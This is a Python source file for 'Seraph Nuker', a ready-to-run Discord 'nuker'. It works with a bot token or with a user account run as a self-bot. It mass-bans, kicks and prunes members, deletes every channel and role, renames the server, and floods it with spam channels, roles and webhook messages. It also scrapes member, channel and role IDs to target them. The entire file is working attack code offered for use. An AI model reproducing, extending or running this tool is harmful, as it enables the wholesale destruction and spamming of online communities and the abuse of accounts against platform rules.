import discord
import requests
import os
import threading
import string
import random
import time
import json
import asyncio
import aiohttp
import pypresence

from pypresence import Presence
from threading import Thread
from discord.utils import find, get
from discord.ext import commands
from time import strftime, gmtime
from discord import Webhook, AsyncWebhookAdapter

os.system('cls & title [Seraph Nuker] - Loading & mode 69,20')

with open('config.json') as f:
    config = json.load(f)

token = config.get('Token')
prefix = config.get('Prefix')

channel_names = config.get('Channel-Names')
server_names = config.get('Server-Names')
role_names = config.get('Role-Names')
reason = config.get('Reason')

spam = config.get('Spam')

webhook_names = config.get('Webhook-Names')
spam_messages = config.get('Spam-Messages')
spam_amount = config.get('Spam-Amount')

def check_token(token: str) -> str:
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": token}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token(token)

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True)
else:
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False)
    
client.remove_command("help")
                
class Seraph:

    def Name(guild):
        try:

            json = {
                'name': random.choice(server_names),
            }
            r = requests.patch(f'https://discord.com/api/v8/guilds/{guild}', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Renamed Guild To\x1b[38;5;213m {json['name']}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Rename Guild\x1b[38;5;213m {json['name']}\x1b[38;5;15")
        except:
            pass

    def CreateWebhook(channel):
        try:
            json = {
                'name': random.choice(webhook_names),
            }
            r = requests.post(f'https://discord.com/api/v8/channels/{channel}/webhooks', headers=headers, json=json)
            web_id = r.json()['id']
            web_token = r.json()['token']
            return f'https://discord.com/api/webhooks/{web_id}/{web_token}'
        except:
            pass

    def SendWebhook(webhook):
        try:
            for i in range(spam_amount):
                payload={
                    'username': random.choice(webhook_names),
                    'content': random.choice(spam_messages)
                }
                requests.post(webhook, json=payload)
        except:
            pass

    def Ban(guild, member):
        try:
            json = {
                'delete_message_days': '7',
                'reason': f'{random.choice(reason)}'
            }
            r = requests.put(f'https://discord.com/api/v8/guilds/{guild}/bans/{member}', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Banned\x1b[38;5;213m {member.strip()}\x1b[38;5;15 ")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Ban\x1b[38;5;213m {member.strip()}\x1b[38;5;15 ")
        except:
            pass
    
    def Kick(guild, member):
        try:
            json = {
                'reason': f'{random.choice(reason)}'
            }
            r = requests.delete(f'https://discord.com/api/v8/guilds/{guild}/members/{member}', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Kicked\x1b[38;5;213m {member.strip()}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Kick\x1b[38;5;213m {member.strip()}\x1b[38;5;15")
        except:
            pass

    def DelChannel(guild, channel):
        try:
            r = requests.delete(f'https://discord.com/api/v8/channels/{channel}', headers=headers)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Deleted Channel\x1b[38;5;213m {channel.strip()}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Delete Channel\x1b[38;5;213m {channel.strip()}\x1b[38;5;15")
        except:
            pass

    def CreateChannel(guild):
        try:
            json = {
                'name': random.choice(channel_names),
                'type': 0
            }
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Created Channel\x1b[38;5;213m {json['name']}\x1b[38;5;15")
                if spam == True:
                    webhook = Seraph.CreateWebhook(r.json()['id'])
                    Thread(target=Seraph.SendWebhook, args=(webhook,)).start()
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Create Channel\x1b[38;5;213m {json['name']}\x1b[38;5;15")
        except:
            pass

    def DelRole(guild, role):
        try:
            r = requests.delete(f'https://discord.com/api/v8/guilds/{guild}/roles/{role}', headers=headers)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Deleted Role\x1b[38;5;213m {role.strip()}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Delete Role\x1b[38;5;213m {role.strip()}\x1b[38;5;15")
        except:
            pass

    def CreateRole(guild):

        try:
            json = {
                'hoist': 'true',
                'name': random.choice(role_names),
                'mentionable': 'true',
                'color': random.randint(1000000,9999999),
                'permissions': random.randint(1,10)
            }
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Created Role\x1b[38;5;213m {json['name']}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Create Role\x1b[38;5;213m {json['name']}\x1b[38;5;15")
        except:
            pass

async def menu():
    os.system(f'cls & mode 85,20 & title [Seraph Nuker] - Connected: {client.user}')
    print(f'''
                               \x1b[38;5;213m╔═╗ ╔═╗ ╦═╗ ╔═╗ ╔═╗ ╦ ╦
                               \033[90m╚═╗ ║╣  ╠╦╝ ╠═╣ ╠═╝ ╠═╣
                               \033[37m╚═╝ ╚═╝ ╩╚═ ╩ ╩ ╩   ╩ ╩
                      
      \x1b[38;5;213m╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      \x1b[38;5;213m║ \033[37m[\x1b[38;5;213m1\033[37m] \033[37mBan Members       \x1b[38;5;213m║\033[37m [\x1b[38;5;213m4\033[37m] \033[37mDelete Roles      \x1b[38;5;213m║\033[37m [\x1b[38;5;213m7\033[37m] \033[37mCreate Roles      \x1b[38;5;213m║\033[37m
      \x1b[38;5;213m║ \033[37m[\x1b[38;5;213m2\033[37m] \033[37mKick Members      \x1b[38;5;213m║\033[37m [\x1b[38;5;213m5\033[37m] \033[37mDelete Channels   \x1b[38;5;213m║\033[37m [\x1b[38;5;213m8\033[37m] \033[37mCreate Channels   \x1b[38;5;213m║\033[37m
      \x1b[38;5;213m║ \033[37m[\x1b[38;5;213m3\033[37m] \033[37mPrune Members     \x1b[38;5;213m║\033[37m [\x1b[38;5;213m6\033[37m] \033[37mNuke Server       \x1b[38;5;213m║\033[37m [\x1b[38;5;213m9\033[37m] \033[37mScrape Info       \x1b[38;5;213m║\033[37m
      \x1b[38;5;213m╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m
         
    ''')
    choice = input("\x1b[38;5;213m> \033[37mChoice\x1b[38;5;213m: \033[37m")

    if choice == "1":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        try:
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\n\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Banning Members.. ')
        
        mainMembers = []
        num = 0
        
        with open("Scraped/members.txt", "r") as f:
            ids = f.readlines()

            for id in ids:
                mainMembers.append(id)

        members_1 = []
        members_2 = []
        members_3 = []
        total = len(mainMembers)
        members_per_arrary = round(total/3)
        
        for member in mainMembers:
            if len(members_1) != members_per_arrary:
                members_1.append(member)
            else:
                if len(members_2) != members_per_arrary:
                    members_2.append(member)
                else:
                    if len(members_3) != members_per_arrary:
                        members_3.append(member)
                    else:
                        pass
        while True:
            #try:
            Thread(target=Seraph.Ban, args=(guild.id, members_1[num],)).start()
            Thread(target=Seraph.Ban, args=(guild.id, members_2[num],)).start()
            Thread(target=Seraph.Ban, args=(guild.id, members_3[num],)).start()
            num += 1
            #except IndexError:
                #break
            #except:
                #pass

        time.sleep(2)
        await menu()

    if choice == "2":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        try:
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Kicking Members..')

        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)
        
        mainMembers2 = []
        num2 = 0
        
        with open("Scraped/members.txt", "r") as f:
            ids = f.readlines()

            for id in ids:
                mainMembers2.append(id)

        members_11 = []
        members_22 = []
        members_33 = []
        total = len(mainMembers2)
        members_per_arrary = round(total/3)
        
        for member in mainMembers:
            if len(members_11) != members_per_arrary:
                members_11.append(member)
            else:
                if len(members_22) != members_per_arrary:
                    members_22.append(member)
                else:
                    if len(members_33) != members_per_arrary:
                        members_33.append(member)
                    else:
                        pass
        while True:
            try:
                Thread(target=Seraph.Kick, args=(guild.id, members_11[num2],)).start()
                Thread(target=Seraph.Kick, args=(guild.id, members_22[num2],)).start()
                Thread(target=Seraph.Kick, args=(guild.id, members_33[num2],)).start()
                num2 += 1
            except IndexError:
                break
            except:
                pass

        time.sleep(2)
        await menu()

    if choice == "3":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        try:
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Pruning Members..')
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)
        await menu()

    if choice == "4":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        try:    
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Deleting Roles..')
        
        rnum = 0
        roles = []
        
        with open("Scraped/roles.txt", "r") as f:
            rids = f.readlines()

            for id in rids:
                roles.append(id)

        while True:
            try:
                Thread(target=Seraph.DelRole, args=(guild.id, roles[rnum],)).start()
                rnum += 1
            except IndexError:
                break
            except:
                pass

        time.sleep(2)
        await menu()

    if choice == "5":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        try:    
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Deleting Channels..')
        
        cnum = 0
        channels = []

        with open("Scraped/channels.txt", "r") as f:
            cids = f.readlines()

            for id in cids:
                channels.append(id)

        while True:
            try:
                Thread(target=Seraph.DelChannel, args=(guild.id, channels[cnum],)).start()
                cnum += 1
            except IndexError:
                break
            except:
                pass

        time.sleep(2)
        await menu()

    if choice == "6":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        role_amount = int(input("\x1b[38;5;213m> \033[37mRole Amount\x1b[38;5;213m: \033[37m"))
        channel_amount = int(input("\x1b[38;5;213m> \033[37mChannel Amount\x1b[38;5;213m: \033[37m"))
        try:    
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Nuking..')
        
        mainMembers3 = []
        num3 = 0
        
        with open("Scraped/members.txt", "r") as f:
            ids = f.readlines()

            for id in ids:
                mainMembers3.append(id)

        members_111 = []
        members_222 = []
        members_333 = []
        total = len(mainMembers3)
        members_per_arrary = round(total/3)
        
        for member in mainMembers3:
            if len(members_111) != members_per_arrary:
                members_111.append(member)
            else:
                if len(members_222) != members_per_arrary:
                    members_222.append(member)
                else:
                    if len(members_333) != members_per_arrary:
                        members_333.append(member)
                    else:
                        pass
        while True:
            try:
                Thread(target=Seraph.Ban, args=(guild.id, members_111[num3],)).start()
                Thread(target=Seraph.Ban, args=(guild.id, members_222[num3],)).start()
                Thread(target=Seraph.Ban, args=(guild.id, members_333[num3],)).start()
                num3 += 1
            except IndexError:
                break
            except:
                pass

        Seraph.Name(guild.id)

        cnum = 0
        channels = []
        
        with open("Scraped/channels.txt", "r") as f:
            cids = f.readlines()

            for id in cids:
                channels.append(id)

        while True:
            try:
                Thread(target=Seraph.DelChannel, args=(guild.id, channels[cnum],)).start()
                cnum += 1
            except IndexError:
                break
            except:
                pass

        for i in range(channel_amount):
            Thread(target=Seraph.CreateChannel, args=(guild.id,)).start()

        rnum = 0
        roles = []
        
        with open("Scraped/roles.txt", "r") as f:
            rids = f.readlines()

            for id in rids:
                roles.append(id)

        while True:
            try:
                Thread(target=Seraph.DelRole, args=(guild.id, roles[rnum],)).start()
                rnum += 1
            except IndexError:
                break
            except:
                pass

        for i in range(role_amount):
            Thread(target=Seraph.CreateRole, args=(guild.id,)).start()
        
        time.sleep(2)
        await menu()

    if choice == "7":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        role_amount = int(input("\x1b[38;5;213m> \033[37mAmount\x1b[38;5;213m: \033[37m"))
        try:    
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Creating Roles..')
        

        for i in range(role_amount):
            Thread(target=Seraph.CreateRole, args=(guild.id,)).start()

        time.sleep(2)
        await menu()

    if choice == "8":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        channel_amount = int(input("\x1b[38;5;213m> \033[37mAmount\x1b[38;5;213m: \033[37m"))
        try:    
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Creating Channels..')
        

        for i in range(channel_amount):
            Thread(target=Seraph.CreateChannel, args=(guild.id,)).start()
        
        time.sleep(2)
        await menu()

    if choice == "9":
        print(f'\n\x1b[38;5;213m[\033[37m?\x1b[38;5;213m]\033[37m Type \x1b[38;5;213m{prefix}scrape\033[37m in the Guild that you want to Scrape.\n')

try:
    RPC = Presence("801856024088281088") 
    RPC.connect() 

    RPC.update(details="Main Menu", large_image="seraph", small_image="seraph", large_text="Seraph Nuker", start=time.time())
except:
    pass

@client.event
async def on_ready():
    if token_type == "bot":
        try:
            await menu()
        except:
            pass

@client.event
async def on_connect():
    if token_type == "user":
        try:
            await menu()
        except:
            pass

@client.command()
async def scrape(ctx):
    await ctx.message.delete()

    try:
        os.remove("Scraped/members.txt")
        os.remove("Scraped/channels.txt")
        os.remove("Scraped/roles.txt")
    except:
        pass

    membercount = 0
    with open('Scraped/members.txt', 'a') as f:
        for member in ctx.guild.members:
            f.write(str(member.id) + "\n")
            membercount += 1
        print(f"\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Scraped \x1b[38;5;213m{membercount}\033[37m Members")

    channelcount = 0
    with open('Scraped/channels.txt', 'a') as f:
        for channel in ctx.guild.channels:
            f.write(str(channel.id) + "\n")
            channelcount += 1
        print(f"\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Scraped \x1b[38;5;213m{channelcount}\033[37m Channels")

    rolecount = 0
    with open('Scraped/roles.txt', 'a') as f:
        for role in ctx.guild.roles:
            f.write(str(role.id) + "\n")
            rolecount += 1
        print(f"\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Scraped \x1b[38;5;213m{rolecount}\033[37m Roles")

    time.sleep(2)
    await menu()

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        pass

def Startup():
    if token_type == "user":
        try:
            client.run(token, bot=False)
        except:
            print(f"\n\033[91m>\033[39m Invalid Token")
            input()
            os._exit(0)

    elif token_type == "bot":
        try:
            client.run(token)
        except:
            print(f"\n\033[91m>\033[39m Invalid Token")
            input()
            os._exit(0)
    else:
        os._exit(0)

if __name__ == "__main__":
    Startup()
